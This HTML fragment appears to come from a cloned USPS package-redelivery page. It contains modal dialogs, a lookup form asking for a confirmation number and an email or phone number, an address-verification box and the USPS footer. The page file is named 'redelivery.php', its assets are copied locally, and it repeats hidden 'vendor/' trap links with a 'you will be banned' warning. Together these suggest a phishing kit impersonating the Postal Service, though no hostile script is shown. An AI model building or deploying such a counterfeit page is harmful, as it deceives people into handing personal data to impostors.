    <div class="modal fade" id="new-search-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Are you sure you want to start a new search?</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>If you select Yes, your current progress will be lost. Select No to go back.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary" id="new-search-yes" data-dismiss="modal" tabindex="0">Yes</a>
                                </div>
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary button--white" id="new-search-no" data-dismiss="modal" tabindex="0">No</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END NEW SEARCH -->



    <!-- START DELETE PACKAGE CONFIRMATION -->
    <div class="modal fade" id="delete-selected-redelivery-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Are you sure you want to remove this package from the Redelivery request?</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>If you select Yes, the package will be removed from this request. Select No to go back.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary" id="delete-package-yes" data-dismiss="modal" tabindex="0">Yes</a>
                                </div>
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary button--white" id="delete-package-no" data-dismiss="modal" tabindex="0">No</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END DELETE PACKAGE CONFIRMATION -->



    <!-- START CALENDAR MODAL -->
    <div class="modal fade" id="modal-start-end" role="dialog">
        <div class="dialog-start-end modal-dialog">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Select Date</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12">
                                <p class="normal select-date-subheader">Available dates are based on the package selected.</p>
                            </div>
                        </div>
                        <div class="row start-end-dates-cal-container">
                            <div class="col-md-12 col-sm-12 col-xs-12 resume-date-cal">
                                <div id="resume-start-cal"></div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 required-field">
                                <p class="normal date-selected"><strong>Date Selected:</strong><input type="text" id="modal-resume-date" disabled="" value=""></p>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary" id="save-resume-date" data-dismiss="modal" tabindex="0">Select</a>
                                </div>
                            </div>
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary button--white clearDates" id="clear-resume-dates" data-dismiss="modal" tabindex="0">Cancel</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END CALENDAR MODAL -->



    <!-- START MODIFY REDELIVERY REQUEST -->
    <div class="modal fade" id="modify-redelivery-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog large">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <a href="redelivery.php#" type="button" id="closeModalModify" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
                    <h3 class="modal-title">Search for an Existing Redelivery Request</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>Please provide your confirmation number and the associated email or phone number below.</p>
                        <br>
                        <p class="">*indicates a required field</p>
                        <div id="appointmentErrorContainer" class="row" style="display: none;">
                            <div class="col-md-12 col-sm-12 col-xs-12 formGroup">
                                <br>
                                <span class="error-icon"></span><span style="margin-left: 25px; font-weight: bold;" id="appointmentError" class="error-message"></span>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 form-group required-field">
                                <label for="" class="">*Confirmation Number</label>
                                <input id="confirmationNumberField" tabindex="0" type="text" class="form-control" value="">
                                <span role="alert" id="confirmationNumberErrorMessage" class="error-message">Please enter a valid confirmation number</span>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 form-group required-field">
                                <label for="" class="">*Enter Email Address or Phone Number</label>
                                <input id="modifyLookupEmail" tabindex="0" type="text" class="form-control" value="">
                                <span role="alert" id="emailAddresConfErrorMessage" class="error-message">Please enter a valid email address or phone number</span>
                            </div>
                        </div>
                        <!--<div class="row">
							<div class="col-md-6 col-sm-6 col-xs-12 form-group email-modify-input">
								<label for="" class="">Email</label>
								<input id="modifyLookupEmail" tabindex="0" type="text" class="form-control">
							</div>
							<div class="col-md-1 col-sm-1 col-xs-12 email-phone-separator">
								<p>or</p>
							</div>
							<div class="col-md-6 col-sm-6 col-xs-12 form-group phone-modify-input">
								<label for="" class="">Phone</label>
								<input id="modifyLookupTelephone" tabindex="0" type="text" class="form-control">
							</div>
						</div>-->
                    </div>
                </div>
                <div class="modal-buttons">
                    <div class="button-container">
                        <a href="redelivery.php#" id="searchRedeliveries" type="button" class="btn-primary" tabindex="0">Search</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END MODIFY REDELIVERY REQUEST -->



    <!-- START CANCEL REDELIVERY REQUEST -->
    <div class="modal fade" id="cancel-redelivery-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Are you sure you want to cancel this Redelivery request?</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>If you select Yes, this entire request will be canceled and cannot be recovered. Select No to go back.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary" tabindex="0">Yes</a>
                                </div>
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary button--white" id="dont-cancel-request" data-dismiss="modal" tabindex="0">No</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END CANCEL REDELIVERY REQUEST -->

    <!-- START CHECK AVAILABILITY MODAL -->
    <div class="modal fade" id="checkAvailabilityModal" role="dialog" style="display: none;">
        <div class="modal-dialog">
            <div class="modal-content modal-container checkAvailabilityModal">
                <div class="modal-header">
                    <button type="button" class="step-one-close close" data-dismiss="modal"></button>
                    <h4 class="step-one-modal-title modal-title">Please choose a valid USPS address that matches the one you entered.</h4>
                </div>
                <div class="step-one-modal-body modal-body">
                    <div class="row">
                        <div class="col-md-12 col-sm-12 col-xs-12 form-group">
                            <p class="step-one-modal-sub sub-header"><strong>Your address as you entered it:</strong></p>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 form-group street-num-name street-num-name">
                            <p id="enteredAddress">123 BROAD ST</p>
                            <p id="enteredCityStateZip">BROOKLYN NY 11206-1234</p>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 mobile-modal step-one-modal-line horizontal-line-container">
                            <hr class="horizontal-line">
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 form-group sub-header-container">
                            <p class="step-one-modal-sub sub-header"><strong>Choose one of the addresses we found:</strong></p>
                        </div>
                        <div class="found-addresses required-field">
                            <div class="pick-valid-address step-one-radio-wrap radio-wrap mobile-modal" id="pickaPlace">
                            </div>
                            <span class="error-message selectAddressError" style="display: none;">Please select one of the addresses found.</span>
                        </div>
                        <div class="col-md-12 col-sm-12 col-xs-12 buttons-holder">
                            <div class="button-container">
                                <a role="button" class="btn-primary use-selected-address">Use Selected Address</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END CHECK AVAILABILITY MODAL -->




    <!-- START UNABLE TO CANCEL REQUEST -->
    <div class="modal fade" id="unable-cancel-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Sorry, your request cannot be canceled.</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>All cancellations must be submitted before 2AM CST on the day of the Redelivery.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper btn-centered">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary" id="" data-dismiss="modal" tabindex="0">Continue</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END UNABLE TO CANCEL REQUEST -->

    <!-- START UNABLE TO CREATE REQUEST -->
    <div class="modal fade" id="unable-create-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Sorry, your request cannot be created.</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>All redeliveries must be submitted before 2AM CST on the day of the Redelivery.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper btn-centered">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary" id="" data-dismiss="modal" tabindex="0">Continue</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END UNABLE TO CREATE REQUEST -->



    <!-- START SERVICE UNAVAILABLE -->
    <div class="modal fade" id="service-unavailable-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <a href="redelivery.php#" type="button" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
                    <h3 class="modal-title">Sorry, this service is currently unavailable. Please try again later.</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper btn-centered">
                                <div class="button-container">
                                    <a href="redelivery.php#" role="button" class="btn-primary" id="close" data-dismiss="modal" tabindex="0">Close</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END SERVICE UNAVAILABLE -->



    <!-- START SPINNER -->
    <div class="white-spinner-wrapper" style="display: none;">
        <div class="white-spinner-container">
            <div class="spinner-content">
                <h5>Loading</h5>
                <div class="white-spinner-progress">
                    <span class="white-spinner">
                        <div class="spinner">
                            <div class="bar-1"></div>
                            <div class="bar-2"></div>
                            <div class="bar-3"></div>
                            <div class="bar-4"></div>
                            <div class="bar-5"></div>
                        </div>
                    </span>
                </div>
                <p>Please wait while we process your request.</p>
            </div>
            <div class="gray-overlay"></div>
        </div>
    </div>
    <div class="results-return">
        <a href="redelivery.php#"><img src="./1_files/backtop.png" alt="Back to Top" title="Back to Top"></a>
    </div>







    <!-- Metrics 2.0 -->




    <div id="global-footer--wrap" class="global-footer--wrap">
<link type="text/css" rel="stylesheet" href="./1_files/main-sb.css">
<link type="text/css" rel="stylesheet" href="./1_files/footer-sb.css">

			<!--[if lte IE 8]>
			<link href="/global-elements/footer/css/main.ie.sb.css" rel="stylesheet" type="text/css" />
			<link href="/global-elements/footer/css/footer.ie.sb.css" rel="stylesheet" type="text/css" />
			<![endif]-->


<footer class="global-footer">
<a href="https://www.usps.com/" class="global-footer--logo-link"></a>
<nav class="global-footer--navigation">
<ol>
<li style="color:#333366;" class="global-footer--navigation-category">
						Helpful Links
						<ol class="global-footer--navigation-options">
<li>
<a href="https://www.usps.com/help/contact-us.htm">Contact Us</a>
</li>
<li>
<a href="https://www.usps.com/globals/site-index.htm">Site Index</a>
</li>
<li>
<a href="https://faq.usps.com/s/">FAQs</a>
</li>
<li><a href="redelivery.php#">Feedback</a></li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
						On About.USPS.com
						<ol class="global-footer--navigation-options">
<li>
<a href="https://about.usps.com/">About USPS Home</a>
</li>
<li>
<a href="https://about.usps.com/newsroom/">Newsroom</a>
</li>
<li>
<a href="https://about.usps.com/newsroom/service-alerts/">USPS Service Updates</a>
</li>
<li>
<a href="https://about.usps.com/resources/">Forms &amp; Publications</a>
</li>
<li>
<a href="https://about.usps.com/what-we-are-doing/gov-services/">Government Services</a>
</li>
<li>
<a href="https://about.usps.com/careers/">Careers</a>
</li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
						Other USPS Sites
						<ol class="global-footer--navigation-options">
<li>
<a href="https://gateway.usps.com/">Business Customer Gateway</a>
</li>
<li>
<a href="https://www.uspis.gov/">Postal Inspectors</a>
</li>
<li>
<a href="https://www.uspsoig.gov/">Inspector General</a>
</li>
<li>
<a href="https://pe.usps.com/">Postal Explorer</a>
</li>
<li>
<a href="https://postalmuseum.si.edu/">National Postal Museum</a>
</li>
<li>
<a href="https://www.usps.com/business/web-tools-apis/">Resources for Developers</a>
</li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
						Legal Information
						<ol class="global-footer--navigation-options">
<li>
<a href="https://about.usps.com/who/legal/privacy-policy/">Privacy Policy</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/terms-of-use.htm">Terms of Use</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/foia/">FOIA</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/no-fear-act/">No FEAR Act EEO Data</a>
</li>
</ol>
</li>
</ol>
</nav>

			<div class="global-footer--copyright">Copyright © 2024 USPS.  All Rights Reserved.</div>


<ul class="global-footer--social">
<li>
    <a style="text-decoration: none;" href="https://www.facebook.com/USPS?rf=108501355848630">
        <img alt="Image of Facebook social media icon." src="./1_files/social-facebook_1.png">
    </a>
</li>
<li>
    <a style="text-decoration: none;" href="https://twitter.com/usps">
	  <img alt="Image of Twitter social media icon." src="./1_files/social-twitter_2.png">
    </a></li>
<li>
	<a style="text-decoration: none;" href="http://www.pinterest.com/uspsstamps/">
        <img alt="Image of Pinterest social media icon." src="./1_files/social-pinterest_6.png">
    </a>
</li>
<li>
    <a style="text-decoration: none;" href="https://www.youtube.com/usps">
     <img alt="Image of Youtube social media icon." src="./1_files/social-youtube_3.png">
    </a>
</li>
</ul>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
</footer>
</div>








<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>


<noscript><img style="display:none" src="tr.gif" width="1" height="1"><a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a></noscript>




<noscript>
<img style="display:none;" alt="" src="_.gif" width="1" height="1">
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
</noscript>


<noscript>
<img style="display:none" src="snoo.gif" width="1" height="1">
</noscript>

<span></span><span id="kampyleButtonContainer"><button id="nebula_div_btn" style="position: fixed !important; border: medium none; margin-top: 0px;" alt="Feedback" tabindex="0" class="kampyle_vertical_button kampyle_right  wcagOutline "><div class="kampyle_button"></div><div data-aut="feedback" class="kampyle_button-text">Feedback</div></button></span>

<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
</body></html>